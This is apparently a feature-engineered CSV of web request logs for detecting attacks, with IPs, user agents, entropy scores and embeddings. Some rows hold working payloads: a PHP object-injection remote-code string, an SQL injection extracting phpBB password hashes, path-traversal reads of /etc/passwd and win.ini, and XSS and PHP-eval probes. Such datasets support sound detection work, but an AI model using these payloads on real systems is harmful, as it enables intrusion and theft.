col_0,col_1,col_2,col_3,col_4,col_5,col_6,col_7,id,meta2,vector,meta3,meta6,meta4,meta5,len_vec,hostname,vector_letters,vector_digits,vector_non_letters,vector_entropy,hostname_letters,hostname_digits,hostname_non_letters,hostname_entropy,meta2_letters,meta2_digits,meta2_non_letters,meta2_entropy,len_meta2,vector_0,vector_1,vector_2,hostname_0,hostname_1,hostname_2,meta2_0,meta2_1,meta2_2
2,1,0,1,1,0,0,3,e770dfe3132db55f8c0f9383530b13ca,Referer,file:///w:/install/netwrix%20active%20directory%20change%20reporter/c48b%20active%20directory%20a%20«g5;>25g5a:8<%20;8f><»_php.htm,200,93.72.200.169,940,"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.140 safari/537.36 edge/17.17134",131,laden-snowshoes.volia.net,76,26,55,4.806079085700266,22,0,3,3.6430741894285688,7,0,0,1.8423709931771084,7,-0.016393570229411125,0.03808450326323509,-0.010130386799573898,0.02144007943570614,0.00732918456196785,0.020496169105172157,0.040736131370067596,-0.020673541352152824,0.015498594380915165
0,0,0,1,1,0,3,3,8c8cc1ed342a2cc21ca5f19f44a216ea,url,http://bigpak.ru/your-data-recovery-questions-answered,302,114.38.129.106,428,mozilla/5.0 (windows nt 6.3; wow64; rv:45.0) gecko/20100101 firefox/45.0,54,114-38-129-106.dynamic-ip.hinet.net,45,0,9,4.343057299246293,17,11,18,4.150292659616668,3,0,0,1.584962500721156,3,0.012853536754846573,0.03170865774154663,-0.001785428961738944,0.07555907219648361,-0.01916489750146866,0.003130985889583826,0.017424333840608597,0.00937733892351389,0.02128124237060547
1,2,0,0,1,1,2,1,826ee15ab3e2a7b61633a53994dbf29a,,"\""1513e03200ef6ffd4e55d6e8ad8e4c19df052d5c621c833b909058cbe8b3fab118cc90e7c5268a5d5df957c0541f8352\""\""\""",200,78.85.214.232,370,samsung sm-j710f stagefright/beyonce/1.1.9 (linux;android 7.0),104,a232.sub214.net78.udm.net,36,60,68,4.047898191373839,13,8,12,3.813660689688185,0,0,0,0.0,0,-0.05897630378603935,0.0853617712855339,-0.0429324209690094,0.018913041800260544,0.02862398326396942,0.054754212498664856,0.0,0.0,0.0
1,0,0,1,0,0,2,4,aed7e264bd3222392c3cf1710ecc12a7,path,file:///storage/emulated/0/android/data/ru.spishi.gdz/cache/answers/251525/img/,200,46.175.212.125,313,apache-httpclient/unavailable (java 1.4),79,Empty,56,7,23,4.299216701033239,5,0,0,2.321928094887362,4,0,0,2.0,4,0.014142870903015137,0.015574215911328793,-0.010662892833352089,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.015656189993023872,0.026461469009518623,-0.07380228489637375
0,0,0,1,1,1,2,3,98615c18705482317c7c044eb599bde8,url,http://adbphotography.co.za/index.php/component/k2/itemlist/user/128488,302,112.120.168.86,427,mozilla/5.0 (windows nt 6.3; wow64; rv:45.0) gecko/20100101 firefox/45.0,71,n112120168086.netvigator.com,52,7,19,4.482090387196117,14,12,14,3.9502120649147465,3,0,0,1.584962500721156,3,0.0015865630703046918,0.04931770637631416,0.012292499653995037,0.0685497373342514,0.05783187970519066,-0.032199639827013016,0.017424333840608597,0.00937733892351389,0.02128124237060547
2,0,0,2,0,0,0,4,e05507abcd684bc914d23b192a892f13,Referer,file://localhost/mtd_down/widgets/user/streamplayer/index.html?country=ru&language=12&lang=de&modelid=genoa_moip&server=operation&remocon=0_650_259_13&area=paneuro&product=0&mgrver=3.745,200,92.195.144.99,477,mozilla/5.0 (windows; u; en-us; rv:1.8.1.11; gecko/20071129; firefox/2.5.0) maple 6.0.00067 navi,186,port-92-195-144-99.dynamic.as20676.net,137,16,49,4.7640032104290375,16,15,22,4.333325210755073,7,0,0,1.8423709931771084,7,0.011172710917890072,-0.008739511482417583,-0.01090966910123825,0.002180607058107853,-0.01417100615799427,0.0235678069293499,0.040736131370067596,-0.020673541352152824,0.015498594380915165
0,0,0,0,0,0,1,7,c95987c35550617b17cf4c8b024302eb,dtid,z___a,200,192.168.105.16,801,"mozilla/5.0 (windows nt 5.1) applewebkit/537.36 (khtml, like gecko) chrome/49.0.2623.112 safari/537.36",5,Empty,2,0,3,1.3709505944546687,5,0,0,2.321928094887362,4,0,0,1.5,4,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.03561495244503021,-0.007353672757744789,0.04465383291244507
2,1,0,0,0,0,1,4,202c60d2fed835b88a88235ef67b66ab,X-Forwarded-For,"odmwi}__ruqscpgalk|o:21:""jdatabasedrivermysqli"":3:{s:4:""\0\0\0a"";o:17:""jsimplepiefactory"":0:{}s:21:""\0\0\0disconnecthandlers"";a:1:{i:0;a:2:{i:0;o:9:""simplepie"":5:{s:8:""sanitize"";o:20:""jdatabasedrivermysql"":0:{}s:5:""cache"";b:1;s:19:""cache_name_function"";s:6:""assert"";s:10:""javascript"";i:9999;s:8:""feed_url"";s:69:""eval(base64_decode($_server['http_cmd']));jfactory::getconfig();exit;"";}i:1;s:4:""init"";}}s:13:""\0\0\0connection"";i:1;}ðýýý, 109.74.151.149",301,109.74.151.149,815,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.125 safari/537.36",450,torsrvu.snydernet.net,243,60,207,5.061877054913944,19,0,2,3.2961483747476237,13,0,2,3.0565647621309537,15,0.03124864585697651,0.0012340373359620571,-0.01193308550864458,0.013273586519062519,-0.0016675814986228943,-0.007161353249102831,-0.050517141819000244,0.08437912166118622,-0.0401972234249115
3,0,0,0,0,1,0,4,11db347de371d1c8ffaafc075f532067,,<...>internal server error<...>,500,80.251.57.222,1013,mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0; .net4.0c; .net clr 1.1.4322; .net clr 2.0.50727; .net clr 3.0.4506.2152; .net clr 3.5.30729; .net4.0e),31,gw.priobye.ru,19,0,12,3.4374366326883625,11,0,2,3.3927474104487847,0,0,0,0.0,0,-0.006343149114400148,-0.003235815791413188,-0.014076508581638336,0.062153588980436325,0.027475962415337563,0.02825799770653248,0.0,0.0,0.0
1,1,0,0,0,1,2,3,632691e2e28ff3fdf0d33915d67ab03b,pll_language,file:///windows/win.ini,504,83.217.200.78,371,arachni/v1.4,23,Empty,17,0,6,3.257500413502068,5,0,0,2.321928094887362,11,0,1,2.8553885422075336,12,-0.016491563990712166,0.057480353862047195,0.022303542122244835,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.051660798490047455,-0.05472293496131897,0.07352294027805328
2,1,1,0,0,2,1,1,10a6bd487a0338bae49e663fa3b6156a,,/catch-words/528.ht../&page=5,200,5.255.253.16,307,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),29,5-255-253-16.spider.yandex.com,16,4,13,4.1852301329094015,15,9,15,4.123231428797621,0,0,0,0.0,0,0.07055433839559555,0.0009613540023565292,-0.020999932661652565,0.07781757414340973,0.03987772762775421,-0.008939712308347225,0.0,0.0,0.0
1,1,1,0,0,2,2,1,a307cf0b1b8d0a1a19bb66da2ecb6ce6,url,http://www.tourismus-jura.ch/sir-francis-bacon-essay.pdf,302,141.8.132.74,406,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),56,spider-141-8-132-74.yandex.com,45,0,11,4.3288908592099045,15,9,15,4.21506101220307,3,0,0,1.584962500721156,3,-0.02696727216243744,0.0215375367552042,0.008967248722910881,0.07781757414340973,0.03987772762775421,-0.008939712308347225,0.017424333840608597,0.00937733892351389,0.02128124237060547
3,1,2,0,0,0,0,2,d45437572895e032cfedb4ee16b2e2b0,,/bin/rencontre-homme-pamiers-32239d-1.html,200,163.172.66.16,203,mozilla/5.0 (compatible; ahrefsbot/5.1; +http://ahrefs.com/robot/),42,oxygen231.a.ahrefs.com,29,6,13,4.261132303628119,16,3,6,3.9705730958116843,0,0,0,0.0,0,0.006802636198699474,0.02339547500014305,0.009709029458463192,0.03534764051437378,0.07750922441482544,-0.002347982255741954,0.0,0.0,0.0
1,0,1,0,1,0,2,3,b400eaa816d4a2509bb77de5c4c3eda7,id,../../etc/passwd,301,128.74.234.75,430,mozilla/5.0 (windows nt 10.0; wow64; rv:50.0) gecko/20100101 firefox/50.0,16,128-74-234-75.broadband.corbina.ru,9,0,7,3.077819531114783,18,10,16,4.035273502696889,2,0,0,1.0,2,0.043133143335580826,0.0230813417583704,0.008114788681268692,0.06734699755907059,0.024982035160064697,0.0239760372787714,0.046362847089767456,0.11150801181793213,0.025058668106794357
0,0,0,0,0,1,0,7,9a21c2673dcc86394c37cee85a6e9a4d,,3079\',200,172.31.1.19,651,mozilla/4.0 (compatible; msie 6.0; windows nt 7.0) ptx,6,Empty,0,4,6,2.584962500721156,5,0,0,2.321928094887362,0,0,0,0.0,0,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
0,0,0,1,1,0,3,3,1dcd4a06a018eb5e8bc8e6aefba82eef,url,http://ramarsamuel.co.uk/badgeup/badge/windows-2000-start-up-issues-top-to-data-loss-and-restoration-solution/,302,114.38.129.106,415,mozilla/5.0 (windows nt 6.3; wow64; rv:45.0) gecko/20100101 firefox/45.0,110,114-38-129-106.dynamic-ip.hinet.net,86,4,24,4.27591278533463,17,11,18,4.150292659616668,3,0,0,1.584962500721156,3,0.006895238533616066,0.020344562828540802,-0.029199473559856415,0.07555907219648361,-0.01916489750146866,0.003130985889583826,0.017424333840608597,0.00937733892351389,0.02128124237060547
1,0,0,0,0,0,0,7,8cccf3444a14bbf52d310c0fe448a467,opt_0,"\'\""()&%<acx><script >vdsk(9882)</script>\""",200,192.168.100.63,821,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.21 (khtml, like gecko) chrome/41.0.2228.0 safari/537.21",43,Empty,19,4,24,4.50127783584588,5,0,0,2.321928094887362,3,1,2,2.321928094887362,5,-0.009685763157904148,0.025698158890008926,-0.038357339799404144,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.029437988996505737,0.17619095742702484,0.10139060765504837
0,1,2,0,1,0,1,3,237aa4efbc64006aed38127be0973e01,url,http://k.merq.org/canberralocksmithsgungahlin805601,302,178.253.223.38,472,"mozilla/5.0 (windows nt 6.3) applewebkit/537.36 (khtml, like gecko) chrome/39.0.2171.95 safari/537.36",51,178-253-223-38.adsl-a-13.sezampro.rs,39,6,12,4.564007204462069,15,13,21,3.9302252658009036,3,0,0,1.584962500721156,3,0.0491483248770237,0.10789275169372559,-0.04429875314235687,0.01290830597281456,-0.07084564864635468,0.0035680935252457857,0.017424333840608597,0.00937733892351389,0.02128124237060547
1,0,1,0,0,1,2,3,fd2a3d1738de6e4134a7713c9403ad6c,r,#!r4 2016-09-27 12:40:14|a:4:{i:0;i:0;i:1;i:3;i:2;i:4;i:3;i:8;}|cp1251,200,31.184.216.210,573,"mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 (khtml, like gecko) chrome/31.0.1650.63 safari/537.36",70,Empty,12,28,58,3.9955937821408054,5,0,0,2.321928094887362,1,0,0,-0.0,1,0.16465042531490326,0.052384644746780396,-0.12516087293624878,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,1,1,0,0,0,2,3,a1194f85b04636b89956054016aab572,REQUEST_GET_ARGS._,1516173695545,404,91.122.222.7,1246,"mozilla/5.0 (windows nt 5.1) applewebkit/537.36 (khtml, like gecko) chrome/57.0.2987.137 yabrowser/17.4.1.1026 yowser/2.5 safari/537.36",13,ip-007-222-122-091.static.atnet.ru,0,13,13,2.5654483718208256,15,12,19,3.819244738933758,14,0,4,3.197159723424149,18,0.0,0.0,0.0,0.062382251024246216,-0.033665575087070465,0.04787397384643555,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
2,2,0,0,0,1,2,1,fa0e20ec09cd4ffc02dcb3c117100d51,action,calendar;year=2012;month=7,200,5.143.231.37,403,mozilla/5.0 (compatible; sputnikbot/2.3; +http://corp.sputnik.ru/webmaster),26,spider-5-143-231-37.sputnik.ru,17,5,9,4.056020968057881,15,9,15,4.015061012203069,6,0,0,2.584962500721156,6,0.03288266062736511,-0.0014534691581502557,-0.00490564713254571,0.03974934294819832,-0.0007039873744361103,-0.010484546422958374,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
1,0,0,2,0,0,1,4,ddc1b268c5e72570c8137a9af63b6661,cat,3{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},404,46.148.48.24,375,{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},93,46-148-48-24.arznet.ru,35,22,58,3.8923988075121954,8,9,14,3.60693673217532,3,0,0,1.584962500721156,3,-0.09015747159719467,-0.008677723817527294,0.13898752629756927,0.06351137161254883,-0.05487808957695961,0.0325220488011837,0.09840408712625504,-0.07091053575277328,0.00418731989338994
1,0,1,0,0,0,0,6,a6901e27ace8d6330f099aa0b8307d3c,REQUEST_COOKIES.User-cn,???? ????????,500,188.170.194.9,1670,"mozilla/5.0 (windows nt 5.1) applewebkit/537.36 (khtml, like gecko) chrome/57.0.2987.137 yabrowser/17.4.1.1026 yowser/2.5 safari/537.36",13,Empty,0,0,13,0.39124356362925566,5,0,0,2.321928094887362,20,0,3,4.0559581516151235,23,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.0068269334733486176,-0.06276649981737137,-0.013647159561514854
2,0,1,1,0,0,1,3,babcda344faad9221ae38f1266bfdc26,id,"cd' and(/**/select 1 /**/from(/**/select count(*),/**/concat((/**/select(/**/select(/**/select binary(/**/concat(0x217e21,ifnull(user_password,char(32)),0x217e21)) /**/from u97281.phpbb3_users /**/limit 25044,1)) /**/from information_schema./**/tables /**/limit 0,1),floor(rand(0)*2))x /**/from information_schema./**/tables /**/group/**/by x)a) and '1'='1",504,83.69.0.57,1299,mozilla/5.0 (windows; u; windows nt 5.1; pt-pt; rv:1.9.1.2) gecko/20090729 firefox/3.5.2 (.net clr 3.5.30729),356,Empty,189,33,167,4.811162170036172,5,0,0,2.321928094887362,2,0,0,1.0,2,0.004724250175058842,0.02943095751106739,-0.006868578493595123,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.046362847089767456,0.11150801181793213,0.025058668106794357
0,1,0,1,0,1,2,3,a03b8a41c70df9d7bafd4b2343827f5c,backurl,/about/news/20299/thumb/phpthumb.php?src=../uplimg/mb100556_0e5613b2fb3ad6274568b0ed0ab3e48e_newspic.img,404,136.243.36.89,492,mozilla/5.0 (compatible; blexbot/1.0; +http://webmeup-crawler.com/),104,static.89.36.243.136.clients.your-server.de,59,30,45,4.839238877250342,25,10,18,4.201356976491468,7,0,0,2.807354922057604,7,-0.02717522159218788,0.02024679258465767,-0.0029888900462538004,0.054857779294252396,-0.02066069468855858,0.010319946333765984,-0.040179770439863205,0.0158260315656662,0.03661968186497688
1,0,2,0,1,0,1,3,cfdea9618b98694471f3ba7aabe73b1a,,/?/.gitconfig,404,185.5.140.253,294,"mozilla/5.0 (windows nt 6.1) applewebkit/537.36 (khtml, like gecko) chrome/28.0.1468.0 safari/537.36",13,140.5.185.253.static.ural.ru,9,0,4,3.238901256602631,12,10,16,3.726474118254376,0,0,0,0.0,0,0.035899169743061066,-0.002523567760363221,0.020972328260540962,0.07503212243318558,-0.035762786865234375,0.014902942813932896,0.0,0.0,0.0
2,1,1,0,0,1,1,2,69a4501d984a8ddce24fbeeb78030b89,,/photogal/public/ru/.../{{_cabinetlink}}/accessible?structure_id=4383,200,178.154.200.5,283,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),69,Empty,48,4,21,4.536010058748924,5,0,0,2.321928094887362,0,0,0,0.0,0,-0.0068564750254154205,0.0555150993168354,0.0149263059720397,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,1,1,0,1,0,1,3,54f8757808866c9e73393b3328198b3e,dest,http://aa55668.com/comment/html/?51525.html,302,156.199.14.138,447,mozilla/5.0 (windows nt 6.3; wow64; rv:45.0) gecko/20100101 firefox/45.0,43,host-156.199.138.14-static.tedata.net,24,10,19,3.9566496523785926,19,11,18,3.91555328506335,4,0,0,2.0,4,0.003831462236121297,0.044989246875047684,-0.023003512993454933,0.02971559390425682,-0.008368296548724174,0.007255672477185726,0.012561958283185959,-0.03192992880940437,-0.08117297291755676
1,1,0,1,0,1,2,2,f398a18fe0d1aa2833cfd1542bf64fe3,,"
--boundaryemae
content-disposition: form-data; name=""data""; filename=""c:\users\nataliaakhmedova\appdata\local\temp\23\v8_b1db_af36.was""
content-type: application/x-zip-compressed


delete from sc_tagged_objects where tag_id not in('11','13') and object_id='1686'",200,185.70.104.11,972,mozilla/4.0 (compatible; win32; winhttp.winhttprequest.5),263,Empty,188,14,75,4.946304340072392,5,0,0,2.321928094887362,0,0,0,0.0,0,-0.0021789383608847857,-0.020216353237628937,-0.029567869380116463,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
2,1,0,1,0,0,2,2,0fe0ea9e106bb0e202de8a99c82788e8,REQUEST_GET_ARGS._,39993730,404,217.66.152.99,960,"mozilla/5.0 (linux; android 5.0.2; sm-a300f build/lrx22g) applewebkit/537.36 (khtml, like gecko) chrome/63.0.3239.111 mobile safari/537.36",8,host-99-152-66-217.spbmts.ru,0,8,8,1.811278124459133,12,10,16,3.9232517969803378,14,0,4,3.197159723424149,18,0.0,0.0,0.0,0.06425502151250839,-0.038102567195892334,0.016810627654194832,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
1,1,0,1,0,1,2,2,f398a18fe0d1aa2833cfd1542bf64fe3,,"
--boundaryemae
content-disposition: form-data; name=""data""; filename=""c:\users\nataliaakhmedova\appdata\local\temp\23\v8_b1db_af36.was""
content-type: application/x-zip-compressed


delete from sc_tagged_objects where tag_id not in('11','13') and object_id='1686'",200,185.70.104.11,972,mozilla/4.0 (compatible; win32; winhttp.winhttprequest.5),263,Empty,188,14,75,4.946304340072392,5,0,0,2.321928094887362,0,0,0,0.0,0,-0.0021789383608847857,-0.020216353237628937,-0.029567869380116463,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,0,1,0,0,2,0,4,9bd17929cfb98772dbd6dbbae0bccb1c,pwd,purple,200,86.80.156.163,462,mozilla/5.0 (windows nt 6.1; wow64; rv:40.0) gecko/20100101 firefox/40.1,6,86-80-156-163.fixed.kpn.net,6,0,0,2.2516291673878226,11,10,16,3.930270372293455,3,0,0,1.584962500721156,3,0.04381288215517998,-0.02584073506295681,-0.007744210306555033,-0.04083481803536415,0.030173679813742638,0.07456458359956741,-0.008016509935259819,0.03202420100569725,0.03764567896723747
0,1,0,1,0,1,1,4,5f398450af426e677ed00812c3ecfe53,url,http://www.itonnet.kr/?document_srl=242901,302,185.70.173.219,398,mozilla/5.0 (windows nt 6.3; wow64; rv:45.0) gecko/20100101 firefox/45.0,42,Empty,27,6,15,4.5381673518043035,5,0,0,2.321928094887362,3,0,0,1.584962500721156,3,-0.009316842071712017,0.0468747615814209,-0.052523236721754074,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.017424333840608597,0.00937733892351389,0.02128124237060547
2,1,0,1,0,0,2,2,0fe0ea9e106bb0e202de8a99c82788e8,REQUEST_GET_ARGS._,39993730,404,217.66.152.99,960,"mozilla/5.0 (linux; android 5.0.2; sm-a300f build/lrx22g) applewebkit/537.36 (khtml, like gecko) chrome/63.0.3239.111 mobile safari/537.36",8,host-99-152-66-217.spbmts.ru,0,8,8,1.811278124459133,12,10,16,3.9232517969803378,14,0,4,3.197159723424149,18,0.0,0.0,0.0,0.06425502151250839,-0.038102567195892334,0.016810627654194832,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
3,1,0,0,1,0,2,1,1ed72ef9f80984ee9147e44e502585bb,"½¿V?çÑ4¸ÐngkEQêM»]??_M""îÚ#?""ÞdúÈaÞ?à}³?ç?n¸ÿ","½¿v?çñ4¸ðngkeqêm»]??_m""îú#?""þdúèaþ?à}³?ç?n¸ÿ",200,188.43.52.163,79467,curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 openssl/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3,47,Empty,24,2,23,4.838599820732889,5,0,0,2.321928094887362,24,2,23,4.881153012222251,47,-0.0024506920017302036,-0.04025742784142494,-0.0013194814091548324,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.0211509857326746,-0.008903378620743752,0.02060813456773758
1,1,2,0,0,0,0,4,447d444617b7cb32344eb60f0c42c2b0,X-Requested-With\';\'CSRF_TOKEN,post\';\'xmlhttprequest\';\'14b058ef395b5453b4d848e75d72f6c51e61721a6bdf922d7ee648f7cf773f135f6d74bfdfa34f05,200,166.216.165.90,970,"mozilla/5.0 (iphone; cpu iphone os 10_0_1 like mac os x) applewebkit/602.1.50 (khtml, like gecko) version/10.0 mobile/14a403 safari/602.1",108,mobile-166-216-165-90.mycingular.net,48,50,60,4.565345032165744,19,11,17,4.260067015271104,23,0,8,4.478232197413861,31,-0.02384956181049347,0.02821129746735096,-0.02529159002006054,0.024039320647716522,-0.02338249795138836,0.03211161866784096,-0.010499680414795876,0.020576322451233864,-0.07098639756441116
0,0,0,3,0,1,1,3,4ae63e715ce85f61d70dc936c0bb83ab,,zmeu,403,46.101.242.22,164,zmeu,4,Empty,4,0,0,2.0,5,0,0,2.321928094887362,0,0,0,0.0,0,-0.0025212846230715513,-0.03403525799512863,0.014336123131215572,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,0,2,0,1,0,1,3,96abf4eda854d6f94347d27ac2fa0195,REQUEST_PATH,/c2/,403,62.168.244.229,140,dirbuster-1.0-rc1 (http://www.owasp.org/index.php/category:owasp_dirbuster_project),4,244-229.utk.ru,1,1,3,1.5,5,6,9,3.039148671903071,11,0,1,3.2516291673878226,12,0.0,0.0,0.0,0.05479701608419418,0.009920730255544186,-0.03091304749250412,-0.00936772022396326,0.014710280112922192,-0.04701574891805649
0,0,0,0,0,0,1,7,a0d27087a4e2466807ff347249da483b,sig_data,mikzqgyjkozihvcnaqccoikzmzccs5ccaqexddakbgyqhqmcagkfadcckqegcsqgsib3dqehaacc\nkpiegpkojvberi0xljqkjeljz9mkmyawig9iago8pc9uexblic9qywdlci9qyxjlbnqgmsawifik\nl01lzglhqm94ifswidagntk1lji4mca4ndeuodkwxqovvhjpbujvecbbmc4wmdagmc4wmdagntk1\nlji4mca4ndeuodkwxqovumvzb3vyy2vzidigmcbsci9hcm91cca8pcavvhlwzsavr3jvdxagl1mg\nl1ryyw5zcgfyzw5jesavq1mgl0rldmljzvjhqia+piakl0nvbnrlbnrzidqgmcbspj4kzw5kb2jq\ncjqgmcbvymokpdwvrmlsdgvyic9gbgf0zurly29kzsavtgvuz3roidi5mjk+pgpzdhjlyw0kejzv\nw1lvhmcr7od52idgtmnbscurkxgsii16enouujxxjknbshglge0hxvkugjybowh0o/it8ufyvu3p\nbf9l9wozaqgxuzm11xv1dr3tzvzl92eyqjs2fzc7ostvn5r5kqspzx72t/z4bfby9zvzadud3t59\nxuzv/jmnad6vs2+/z2x+anrgdfrevhadx/kbwps8pye5cmq+klrz552uhqkxs1d5fj3bylazi5ff\n+222mf1g3bkv0ekkwvtitlc4kkur8mypcbheaklwbz7dym9+bl/8wzsj0kwj2rztvnhv2ndcy0qm\nwgah2u5wzxrxkppzbtzlhz4c4v4wowieul4/ycyckdy3ehipuefza9x1ghcxiw6yo4cfei2fti6f\npetbz2trsnjjbwljfsjwwhq3xi5qptdv3tyvlfos1etg2+tzdjfkmhgrth0jv6w66rrib0d1ebyp\nqukxupyep3gehwf6zpbtxb1iavaykttzcmg8riwmtpc1meym0gbk+mkbdm4dgayy,200,172.17.16.46,70373,"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",1000,Empty,839,133,161,5.123209755705887,5,0,0,2.321928094887362,7,0,1,2.75,8,-0.0018209954723715782,0.004326355177909136,0.005049115978181362,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.008839922957122326,0.06708663702011108,-0.05702526867389679
1,2,0,0,0,1,4,0,8d0828378412da6a2ee4ee279ec5c9da,/members/page__sort_key__joined__sort_order__asc__max_results__20__quickjump__?__name_box__begins__name__%D0%9A__quickjump__C,/members/page__sort_key__joined__sort_order__asc__max_results__20__quickjump__?__name_box__begins__name__%d0%9a__quickjump__c,200,217.69.136.206,430,mozilla/5.0 (compatible; linux x86_64; mail.ru_bot/2.0; +http://go.mail.ru/help/robots),125,fetcher5-3.p.mail.ru,84,4,41,4.155461038036581,14,2,6,3.8841837197791884,84,4,41,4.234662114275702,125,0.02688777819275856,-0.03488698601722717,-0.050089456140995026,0.047304559499025345,0.01849718950688839,0.07323554903268814,0.0031544985249638557,-0.01926695555448532,-0.021063992753624916
1,0,0,0,1,1,1,4,37a6562739fb0a3782077090763d4809,RESPONSE_HEADERS.AN-X-Request-Uuid,b239731c-8a7a-4e47-babb-23063b30f119,200,217.175.140.69,4006,mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko,36,Empty,11,21,25,3.6842599054599776,5,0,0,2.321928094887362,29,0,5,4.1973257087065035,34,-0.12504640221595764,0.09105034172534943,0.055874988436698914,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.01747806742787361,-0.03407561406493187,0.0034997568000108004
1,1,0,0,0,1,1,4,e11afa0c8393f08005be546550778888,REQUEST_GET_ARGS._,490654153,404,37.21.25.34,1672,"mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/63.0.3239.132 safari/537.36",9,Empty,0,9,9,2.725480556997868,5,0,0,2.321928094887362,14,0,4,3.197159723424149,18,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
1,2,0,0,1,0,1,3,c6090ad92c6d63416644e6d0d4bdd04b,s,salut|{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},502,2a02:408:7722:1:77:222:57:52,414,|{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},98,Empty,40,21,58,4.110691549908582,5,0,0,2.321928094887362,1,0,0,-0.0,1,-0.0846233069896698,-0.007587225642055273,0.12423426657915115,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,0,0,0,1,1,1,4,d38cd748dda3751dad4995504894ed75,Location,//x01.aidata.io/0.gif?pid=6472613&id=5a79531534799b6726422ea1&dest=%2f%2fdmp.adx.com.ru%2fadspend%3fuid%3d5a79531534799b6726422ea1%26r%3d%252f%252fdmg.digitaltarget.ru%252f1%252f224%252fi%252fi%253fa%253d224%2526e%253d5a79531534799b6726422ea1%2526i%253d1887580278695327777%2526r%253d%25252f%25252fsync.videonow.ru%25252fssp%25253fdsp%25253d11%252526uuid%25253d5a79531534799b6726422ea1,302,217.175.140.69,954,"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/51.0.2704.79 safari/537.36 edge/14.14393",384,Empty,130,207,254,4.446994134476015,5,0,0,2.321928094887362,8,0,0,2.75,8,-0.0066328272223472595,0.04750367999076843,-0.022707974538207054,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.07494255155324936,-0.048140477389097214,0.011859326623380184
